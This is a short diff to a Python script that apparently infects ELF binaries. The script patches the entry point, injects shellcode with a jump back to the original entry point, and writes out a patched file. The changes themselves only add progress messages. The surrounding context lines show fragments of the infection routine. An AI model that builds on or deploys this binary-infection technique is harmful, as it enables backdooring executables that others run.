@@ -184,7 +184,9 @@ def infect_entry_point():
     
     elif bits == 32:
         header.machine_type = lief.ELF.ARCH.AARCH32
-
+	
+    print("[+] Entry Point Patched")
+    
     binary.write("{}_patched".format(file))
 
 def injection():
@@ -224,7 +226,9 @@ def injection():
         SHELLCODE.append(p32(int(entry_point)))
         SHELLCODE.append(0xff)
         SHELLCODE.append(0xe5)
-
+	
+    print("[+] Jump on OEP added")
+	
     fd.seek(int(pt_load_1_end, 16))
     fd.write(SHELLCODE)
     fd.close()
@@ -236,4 +240,5 @@ loader()
 infect_entry_point()
 injection()
 
+print("")
 print("[~] Injected correctly [~]")
